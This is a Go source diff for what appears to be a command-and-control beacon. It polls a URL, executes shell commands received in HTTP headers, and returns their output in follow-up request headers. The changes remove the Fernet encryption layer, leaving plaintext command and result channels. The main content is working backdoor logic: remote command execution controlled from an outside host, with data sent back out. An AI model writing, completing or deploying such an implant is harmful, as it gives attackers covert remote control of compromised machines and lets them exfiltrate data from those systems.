@@ -8,8 +8,6 @@ import (
 	"os"
 	"os/exec"
 	"time"
-
-	"github.com/fernet/fernet-go"
 )
 
 // generateRandomFilename creates a random filename with extension
@@ -45,32 +43,6 @@ func executeCommand(command string) (string, error) {
 	}
 
 	return out.String(), nil
-}
-
-// decodeWithFernet decodes the given string using Fernet with the provided key
-func decodeWithFernet(encodedStr string, key string) (string, error) {
-	fernetKey := fernet.Key([]byte(key))
-
-	// Decode the message
-	msg := fernet.VerifyAndDecrypt([]byte(encodedStr), 0, []*fernet.Key{&fernetKey})
-	if msg == nil {
-		return "", fmt.Errorf("failed to decode message")
-	}
-
-	return string(msg), nil
-}
-
-// encryptWithFernet encrypts the given string using Fernet with the provided key
-func encryptWithFernet(plaintext string, key string) (string, error) {
-	fernetKey := fernet.Key([]byte(key))
-
-	// Encrypt the message
-	token, err := fernet.EncryptAndSign([]byte(plaintext), &fernetKey)
-	if err != nil {
-		return "", err
-	}
-
-	return string(token), nil
 }
 
 const (
@@ -122,31 +94,19 @@ func main() {
 			continue
 		}
 		
-		// Decode the header value with Fernet using the fingerprint as key
-		decodedCommand, err := decodeWithFernet(command, fingerprint)
-		if err != nil {
-			continue
-		}
-		
 		// Execute the decoded bash command
-		cmdOutput, err := executeCommand(decodedCommand)
+		cmdOutput, err := executeCommand(command)
 		if err != nil {
 			continue
 		}
 		
-		// Encrypt the command output using Fernet
-		encryptedOutput, err := encryptWithFernet(cmdOutput, fingerprint)
-		if err != nil {
-			continue
-		}
-
 		// Set up the follow-up request
 		followupReq, err := http.NewRequest("GET", url, nil)
 		if err != nil {
 			continue
 		}
 
-		followupReq.Header.Set(RESULT_HEADER, encryptedOutput)
+		followupReq.Header.Set(RESULT_HEADER, cmdOutput)
 		followupReq.Header.Set(ID_HEADER, id)
 		followupReq.Header.Set(FINGERPRINT_HEADER, fingerprint)
 		
